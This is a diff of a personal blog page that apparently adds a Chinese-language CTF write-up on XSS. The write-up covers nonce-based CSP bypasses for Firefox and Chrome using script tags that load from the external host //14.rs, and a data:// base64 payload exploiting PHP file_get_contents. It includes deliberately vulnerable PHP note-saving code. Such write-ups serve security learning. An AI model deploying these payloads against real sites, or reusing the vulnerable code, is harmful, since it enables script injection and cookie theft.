@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="xss,CSP,data://,">
 
 
 
@@ -79,13 +79,28 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="jessic4fl">
-<meta property="og:url" content="http://yoursite.com/archives/2018/12/index.html">
+<meta name="description" content="最近做一道关于XSS的CTF题目，用到了data://协议触发XSS，并且需要绕过带nonce的CSP策略。由于题目环境没有了，这里主要总结一下其中用到的一些技巧。">
+<meta name="keywords" content="xss,CSP,data:&#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS--CSP绕过【firefox和chrome】和data:&#x2F;&#x2F;协议的使用">
+<meta property="og:url" content="http://yoursite.com/2018/12/08/xss-1/index.html">
 <meta property="og:site_name" content="jessic4fl">
+<meta property="og:description" content="最近做一道关于XSS的CTF题目，用到了data://协议触发XSS，并且需要绕过带nonce的CSP策略。由于题目环境没有了，这里主要总结一下其中用到的一些技巧。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7255840-a124305a7564466f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7255840-ea6d717b0370cbee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7255840-1ef1f2018f15dcce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7255840-39b24ba7576b034d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7255840-e251d0c0d39f24c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7255840-c9b980f3e6c551b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7255840-2af6b486e50046b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7255840-836455200a4d7dd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/7255840-1d13871144f00724.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-08T14:36:12.844Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="jessic4fl">
+<meta name="twitter:title" content="XSS--CSP绕过【firefox和chrome】和data:&#x2F;&#x2F;协议的使用">
+<meta name="twitter:description" content="最近做一道关于XSS的CTF题目，用到了data://协议触发XSS，并且需要绕过带nonce的CSP策略。由于题目环境没有了，这里主要总结一下其中用到的一些技巧。">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/7255840-a124305a7564466f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 
 
 
@@ -115,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/archives/2018/12/">
+  <link rel="canonical" href="http://yoursite.com/2018/12/08/xss-1/">
 
 
 
 
 
-  <title>归档 | jessic4fl</title>
+  <title>XSS--CSP绕过【firefox和chrome】和data://协议的使用 | jessic4fl</title>
   
 
 
@@ -140,7 +155,7 @@
     
   
 
-  <div class="container sidebar-position-right page-archive">
+  <div class="container sidebar-position-right page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -286,107 +301,210 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
-
-      <span class="archive-page-counter">
-        
-        
-        
-          
-        
-        嗯..! 目前共计 2 篇日志。 继续努力。
-      </span>
-
-      
-
-        
-        
-        
-
-        
-          
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2018">2018</h1>
-          </div>
-        
-        
-
-        
 
   <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/08/xss-1/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="jessica">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jessic4fl">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/12/08/xss-1/" itemprop="url">
-              
-                <span itemprop="name">XSS--CSP绕过【firefox和chrome】和data://协议的使用</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">XSS--CSP绕过【firefox和chrome】和data://协议的使用</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-12-08T22:31:53+08:00" content="2018-12-08">
-          12-08
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-12-08T22:31:53+08:00">
+                2018-12-08
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web-security/" itemprop="url" rel="index">
+                    <span itemprop="name">web security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/12/08/xss-1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2018/12/08/xss-1/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2018/12/08/hello-world/" itemprop="url">
-              
-                <span itemprop="name">Hello World</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-12-08T21:08:08+08:00" content="2018-12-08">
-          12-08
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
+      
+        <p>最近做一道关于XSS的CTF题目，用到了data://协议触发XSS，并且需要绕过带nonce的CSP策略。由于题目环境没有了，这里主要总结一下其中用到的一些技巧。<br><a id="more"></a></p>
+<p>##CSP绕过<br>在绕过csp策略的时候，找到了以下这篇文章<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a></p>
+<blockquote>
+<p>由于使用了CSP策略，一般想要获取cookie的方法，主要是使用以下几种跳转语句。<br><img src="https://upload-images.jianshu.io/upload_images/7255840-a124305a7564466f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+</blockquote>
+<p><img src="https://upload-images.jianshu.io/upload_images/7255840-ea6d717b0370cbee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>对于带有nonce的CSP策略，要执行跳转语句可以使用这种方式绕过，但是由于Chrome和Firefox对于标签的补齐和解析使用了不一样的方式，因此这个绕过的payload有些不一样。</p>
+<ul>
+<li><p><strong>在firefox上可以直接使用上述的payload，只要把跳转语句写入  <code>src</code>  指向的文件<code>//14.rs</code>就可以了，因为属性 <code>a</code>  后面的 <code>&quot;</code> 会被优先解析，这样就会把里面的<code>&lt;/p&gt;
+&lt;script id=</code>解析成字符串，从而成功引入了带有<code>nonce</code>的<code>script</code>，从而成功执行<code>src</code>里的内容。</strong></p>
+</li>
+<li><p><strong>Chrome对于标签的解析方式则不同，虽然它也是这样补齐了标签，但是解析的时候仍然会优先解析<code>&quot;</code>里的<code>script</code>，导致发生错误，无法实现xss。在这种情况下，只需要使用Chrome解析html5 的属性的一种特性——浏览器只会解析同一个标签内的第一个属性，对于后面的同名属性，会自动忽略掉。因此，只要改一下payload：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//14.rs  a=&quot;test&quot; a=&quot;   </span><br><span class="line">//这样会把后面 a=&quot;&lt;/p&gt;&lt;script id=&quot;给直接忽略掉</span><br><span class="line">或者</span><br><span class="line">&lt;script src=//14.rs src=&quot;</span><br><span class="line">//把src后面的内容直接忽略</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>由此可以成功引入带有<code>nonce</code>的<code>&lt;script&gt;</code>标签，成功执行XSS。</p>
+<p>##data://协议使用<br>在XSS的时候，可能常常会用到php伪协议的辅助，比如这样两种情况：</p>
+<ul>
+<li>对于提交的内容，通过<code>htmlspecialchars()</code>函数来转义特殊字符，然后保存到某个文件里，之后通过文件包含，把文件的内容输出到某个html标签之间。</li>
+<li>对于提交的内容，通过htmlspecialchars()函数来转义特殊字符，然后把内容在某个HTML标签内输出出来。</li>
+</ul>
+<p>在这种情况下，怎么去触发XSS呢？<br>这个时候，可以考虑使用data://这个协议：<br><img src="https://upload-images.jianshu.io/upload_images/7255840-1ef1f2018f15dcce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/7255840-39b24ba7576b034d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>只要把红框中的内容修改成<code>&lt;script&gt;alert(1)&lt;script&gt;</code>的base64编码<code>JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==</code>就可以触发xss了。</p>
+<p>###实例<br>使用php实现一个简单的笔记上传保存到文件里，并显示到网页的功能：<br>getnote.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;dataXSS&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;upnote.php&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;p&gt;note:&lt;/p&gt;</span><br><span class="line">	&lt;input type=&quot;text&quot; name=&quot;note&quot; &gt;</span><br><span class="line">	&lt;input type=&quot;submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;p&gt;your input url:&lt;/p&gt;&quot;.&quot;&lt;p&gt;&quot;.urldecode(file_get_contents($url)) .&quot;&lt;/p&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>upnote.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">file_put_contents(&apos;url.txt&apos;,htmlspecialchars($_POST[note]));</span><br><span class="line">header(&apos;location:getnote.php?url=url.txt&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>程序的逻辑很简单，不多介绍。首先我们访问：getnote.php，把笔记的内容写成<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，然后提交：<br><img src="https://upload-images.jianshu.io/upload_images/7255840-e251d0c0d39f24c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/7255840-c9b980f3e6c551b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>没有发生弹框，检查元素可以发现<code>&lt;,&gt;</code>都被<code>htmlspecialchars()</code><br>转义了，看一下文件内容发现也被转义了，如下图：<br><img src="https://upload-images.jianshu.io/upload_images/7255840-2af6b486e50046b4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>这个时候，我们发现读取url的函数使用的是<code>file_get_contents($url)</code>，因此可以使用data://协议，构造下面的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getnote.php?url=data://text/plain;base64,JTNDc2NyaXB0JTNFYWxlcnQlMjgxJTI5JTNDL3NjcmlwdCUzRQ==</span><br></pre></td></tr></table></figure></p>
+<p>访问，发现弹框了。<br><img src="https://upload-images.jianshu.io/upload_images/7255840-836455200a4d7dd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/7255840-1d13871144f00724.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+
+      
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag"># xss</a>
+          
+            <a href="/tags/CSP/" rel="tag"># CSP</a>
+          
+            <a href="/tags/data/" rel="tag"># data://</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/08/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -394,6 +512,20 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -633,6 +765,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -650,6 +786,18 @@
       <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
     
 
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2018/12/08/xss-1/';
+          this.page.identifier = '2018/12/08/xss-1/';
+          this.page.title = 'XSS--CSP绕过【firefox和chrome】和data://协议的使用';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
     
 
   
